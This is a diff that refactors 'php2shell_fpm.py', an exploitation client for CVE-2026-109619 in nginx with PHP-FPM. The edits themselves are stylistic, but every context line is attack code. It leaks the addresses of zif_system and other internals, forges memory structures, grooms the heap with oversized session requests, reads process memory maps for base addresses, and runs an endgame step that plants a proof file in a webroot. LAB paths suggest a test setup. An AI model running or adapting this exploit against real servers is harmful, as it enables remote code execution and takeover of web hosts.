@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 """
 php2shell_fpm.py — CVE-2026-109619 exploitation client for nginx + PHP-FPM.
 
@@ -45,6 +44,7 @@ Subcommands:
 from __future__ import annotations
 
 import argparse
+import contextlib
 import json
 import os
 import re
@@ -273,7 +273,7 @@ class Oracle:
         print(f"zif_system  0x{self.zif:x}")
         print(f"zval_ptrdtor 0x{self.dtor:x}")
         print(f"BG.data     0x{d:x}  level={level}")
-        print(f"chunk_base  {('0x%x' % chunk) if chunk else None}")
+        print(f"chunk_base  {hex(chunk) if chunk else None}")
 
 
 # --------------------------------------------------------------------------- #
@@ -439,7 +439,10 @@ def cmd_build_ref(args) -> int:
     sid = REF_SID
     status, body = ref_session_post(builder, sid)
     path = session_file(args.version, sid)
-    content = open(path, "rb").read() if os.path.isfile(path) else b""
+    content = b""
+    if os.path.isfile(path):
+        with open(path, "rb") as handle:
+            content = handle.read()
     print(f"builder status={status} body={body[:40]!r}")
     print(f"session_file={path} content={content!r}")
     return 0 if b"R:2" in content else 1
@@ -531,7 +534,6 @@ def _forged_benign(param_addr: int) -> bytes:
     # +56 entries.used_slots = 8 (so R:2 -> data[1] is inside our data[])
     struct.pack_into("<q", buf, 56, 8)
     # FZ at +0x300: IS_LONG 424242
-    fz = param_addr + 0x300  # placeholder; caller rewrites with real d-relative
     struct.pack_into("<Q", buf, 72 + 8, 0)  # data[1] set by caller
     struct.pack_into("<Q", buf, 0x300, 424242)
     struct.pack_into("<I", buf, 0x308, 4)   # IS_LONG
@@ -708,10 +710,8 @@ def cmd_endgame(args) -> int:
     size, need = 12288, 0x900
 
     local_proof = os.path.join(LAB, "webroot", proof)
-    try:
+    with contextlib.suppress(OSError):
         os.remove(local_proof)
-    except OSError:
-        pass
 
     worker_before = find_pool_worker(args.version, "chain")
     for _attempt in range(4):
@@ -930,9 +930,9 @@ def _local_bases(version: str) -> tuple[int, int]:
             parts = line.split()
             start_s, end_s = parts[0].split("-")
             start, end = int(start_s, 16), int(end_s, 16)
-            if len(parts) >= 6 and parts[-1] == exe:
-                if pie is None or start < pie:
-                    pie = start
+            if (len(parts) >= 6 and parts[-1] == exe
+                    and (pie is None or start < pie)):
+                pie = start
             if chunk is None and "rw-p" in parts[1] and end - start == MEM_CHUNK:
                 chunk = start
     if pie is None or chunk is None:
@@ -999,10 +999,8 @@ def cmd_no_oracle(args) -> int:
     for attempt in range(8):
         d_off, k = candidates[attempt % len(candidates)]
         d = chunk + d_off
-        try:
+        with contextlib.suppress(OSError):
             os.remove(local_proof)
-        except OSError:
-            pass
         # arm #1, then normalize the post-arm heap with a pads+big request
         # that has the same allocation shape as the calibrated probe.
         big_session_post(builder, OOM_SID, args.size)
